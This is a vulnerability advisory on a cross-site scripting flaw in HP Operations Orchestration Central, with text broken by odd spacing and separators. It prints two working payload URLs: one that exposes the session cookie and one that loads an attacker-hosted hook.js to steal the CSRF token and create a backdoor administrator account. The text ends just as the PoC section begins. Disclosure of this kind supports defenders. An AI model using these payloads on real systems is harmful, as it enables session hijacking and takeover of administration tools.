BACKGROUND  ， HP Operations Orchestration ( HP OO ) is a solution for automating IT tasks.  ， HP Operations Orchestration Central is used to administrate this tool. The  ， HP Operations Orchestration tool also has a webservice ( SOAP-based ) that  ， allows you to have complete controle over HP OO.  ， II. DESCRIPTION  ， The HP Operations Orchestration Central application is vulnerable to XSS.  ， Not only can we steal an administrators session cookie. We can use this  ， XSS to extract the CSRF-token as well and this way we are able to remotely  ， create supplementary ( administrator ) user accounts. Once this account is  ， created it can be used ( once again from the exterior ) to send and recieve  ， messages from the SOAP webservice.  ， All these examples have been tested with FF 24.0.  ， III. It all starts with a XSS  ， https : /x.x.x.x : 8443/PAS/app%3F%3Cimg%20src=x%20onerror=alert%28document.cookie%29 ; %20/  ， It is clear that in this way you can easily steal session cookies ,   ， especially since the HTTPOnly-flag is not set for the session cookie. The  ， attack can be very simple like tricking an administrator to visit a webpage  ， that contains a hidden iFrame. The session can be hijacked and the  ， attacker can administer the complete tool.  ， The XSS vulnerability can also be exploited from the exterior. An attacker  ， can for example add a backdoor admin user , or manage flows. E.g. to add a  ， supplementary user an attacker needs to extract the CSRF-token and and call  ， the page to create a supplementary user account with preferably  ， administrator rights. Since the attacker has control over the chosen  ， password of his newly created user , these credentials can be used to call  ， methods from the SOAP Webservice. This gives the attacker complete remote  ， control from the exteriour over the orchestration tool.  ， Since for the PoC a bunch of javascript needs to be executed , we assume  ， that the javascript file is hosted on a remote server and is appended to  ， the DOM via XSS :   ， https : /x.x.x.x : 8443/PAS/app%3F  ， <img%20src=x%20onerror=\"var%20script=document.createElement ( 'script' )  ; script.type='text/javascript' ; script.src='  ， https : /y.y.y.y : 9887/hook.js' ; document.body.appendChild ( script )  ; \"%20/  ， In this example x.x.x.x is the ip address of the HP OO Central application  ， en y.y.y.y is the ip address of a server controled by the attacker.  ， Consider the javascript code in the next paragraph as a complete PoC. It  ， extracts the CSRF-token , adds a new admin user and makes a SOAP call which  ， relies on the newly created user.  ， IV. PoC",
